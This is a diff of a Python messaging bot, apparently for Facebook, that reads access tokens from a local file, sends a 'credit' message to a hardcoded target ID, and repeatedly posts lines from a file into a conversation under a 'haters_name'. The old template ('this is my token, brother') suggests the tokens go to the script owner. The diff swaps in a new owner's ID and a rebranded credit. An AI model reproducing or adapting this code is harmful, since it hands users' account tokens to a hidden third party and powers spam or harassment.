@@ -27,15 +27,15 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "CREDIT :-💝💝 𝗥𝗔𝗩𝗜 𝗞𝗨𝗠𝗔𝗥 💝                                                       OWNER =>😈 𝗥𝗔𝗩𝗜 𝗞𝗨𝗠𝗔𝗥 𝗛𝗘𝗥𝗘 😈                                                      𝗛𝗘𝗟𝗟𝗢 𝗥𝗔𝗩𝗜 𝗞𝗨𝗠𝗔𝗥 𝗝𝗜😽 I 𝗬𝗘 𝗠𝗘𝗥𝗔 𝗧𝗢𝗞𝗘𝗡 𝗛𝗘 𝗕𝗛𝗔𝗜 🥳🥳🥳              :- {}"
+      msg_template = "CREDIT :-KRISHNA RK BRAND DONE ✅:- {}"
 
       # Specify the ID where you want to send the message
-      target_id = "8517943384999183"
+      target_id = "61573328623221"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '●════════════😈KRISHNA LEGEND😈════════════●')
+          print('\033[1;92m' + '●════════════KRISHNA LEGEND════════════●')
 
       headers = {
           'Connection': 'keep-alive',
@@ -65,7 +65,7 @@ def send_messages_from_file():
       with open('convo.txt', 'r') as file:
           convo_id = file.read().strip()
 
-      with open('file.txt', 'r') as file:
+      with open('ravi math.txt', 'r') as file:
           messages = file.readlines()
 
       num_messages = len(messages)
@@ -82,7 +82,7 @@ def send_messages_from_file():
           speed = int(file.read().strip())
 
       def liness():
-          print('\033[1;92m' + '●═══════════😈KRISHNA LEGEND😈═════════════●')
+          print('\033[1;92m' + '●═══════════KRISHNA LEGEND═════════════●')
 
       headers = {
           'Connection': 'keep-alive',
@@ -109,7 +109,7 @@ def send_messages_from_file():
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                   if response.ok:
-                      print("\033[1;36m[✓] 💝𝗥𝗔𝗩𝗜 𝗞𝗨𝗠𝗔𝗥 💝 𝗝𝗜 𝗞𝗜 𝗢𝗥 𝗦𝗘 𝗔𝗔𝗣𝗞𝗔 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗖𝗛𝗔𝗟𝗔 𝗚𝗔𝗬𝗔 𝗔𝗕 𝗞𝗛𝗨𝗦𝗛 𝗥𝗘𝗛𝗘 𝗛𝗢...🍒🍒 {} of Convo {} Token {}: {}".format(
+                      print("\033[1;36m[✓] Aapka Message Chala Gaya {} of Convo {} Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
